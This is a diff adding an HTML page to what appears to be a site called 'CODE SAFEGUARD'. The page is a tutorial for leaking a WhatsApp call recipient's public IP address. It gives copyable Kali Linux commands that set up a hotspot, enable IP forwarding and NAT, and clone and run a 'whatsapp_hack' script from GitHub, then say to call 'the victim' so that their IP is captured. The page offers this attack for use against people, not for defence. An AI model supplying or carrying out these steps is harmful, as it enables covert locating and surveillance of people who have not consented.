@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon" />
+    <link rel="stylesheet" href="pages.css">
+    <title>Whatsapp Call IP tracing</title>
+</head>
+<body>
+    <div class="container">
+        <nav>
+            <a href="home.html" style="font-size: 30px;">
+                <h2 class="abc">CODE SAFEGUARD</h2>
+            </a>
+            <a href="callToIP.html">
+                <ul>
+                    <li>Whatsapp Call To IP</li>
+                </ul>
+            </a>
+        </nav>
+        <p>
+            <br>New WhatsApp Bug (Leak Public IP Addresses)<br>
+            <div class="custom-box">
+              <p class="ab"><br>Requirements:</p> 
+             <p> Kali Linux<br><br>Internet <br></p> 
+            </div>
+            <br><br><br><br><br>
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/qnVg9cRhjsE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen ></iframe>
+           <br><br><br><br><br> <div class="custom-box">
+                <b class="bc"><br><br>COMMANDS<br></b><br><br>
+                <div class="button-container">
+                    <button class="copy-button" onclick="copyCommandsToClipboard()">Copy Commands</button>
+                </div><br>
+                <pre class="command">
+                    wget https://github.com/prahladyeri/hotspotd/raw/master/dist/hotspotd-latest.tar.gz<br>
+                    tar xvf hotspotd-latest.tar.gz<br>
+                    cd hotspotd-0.1.6/<br><br>
+                    sudo python setup.py install<br>
+                </pre>
+                <i>Setup the hotspotd</i>
+                <pre class="command">
+                    sudo hotspotd start<br>
+                    <i><br>Open a new terminal and type<br></i>
+                    echo 1 > /proc/sys/net/ipv4/ip_forward<br>
+                    iptables -t nat -I POSTROUTING -j MASQUERADE<br>
+                    git clone https://github.com/ashwanthcreators/whatsapp_hack<br>
+                    cd whatsapp_hack<br>
+                    chmod +x whatsapp.sh<br>
+                    ./whatsapp.sh<br>
+                </pre>
+                <i><br>Connect the hotspot to your phone<br>
+                Open WhatsApp, call the victim from your phone, and disconnect the call once established<br>
+                Now the IP address of the victim would be captured in the Kali machine<br></i>
+            </div>
+        </p>
+    </div>
+    <script src="pages.js"></script>
+</body>
+</html>
